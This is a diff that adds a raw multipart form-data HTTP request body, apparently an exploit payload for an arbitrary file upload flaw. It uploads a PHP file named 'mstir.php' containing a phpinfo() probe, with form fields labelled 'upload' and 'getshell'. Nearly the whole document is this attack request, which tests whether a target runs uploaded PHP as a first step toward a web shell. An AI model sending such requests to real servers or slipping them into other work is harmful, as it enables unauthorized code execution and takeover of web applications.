@@ -1,0 +1,26 @@
+--I am lonely
+Content-Disposition: form-data; name="file"; filename="mstir.php"
+Content-Type: application/octet-stream
+
+<?phpinfo();?>
+--I am lonely
+Content-Disposition: form-data; name="t"
+
+a
+--I am lonely
+Content-Disposition: form-data; name="m"
+
+156as1f56safasfasfa
+--I am lonely
+Content-Disposition: form-data; name="act"
+
+upload
+--I am lonely
+Content-Disposition: form-data; name="r_size"
+
+14
+--I am lonely
+Content-Disposition: form-data; name="submit"
+
+getshell
+--I am lonely
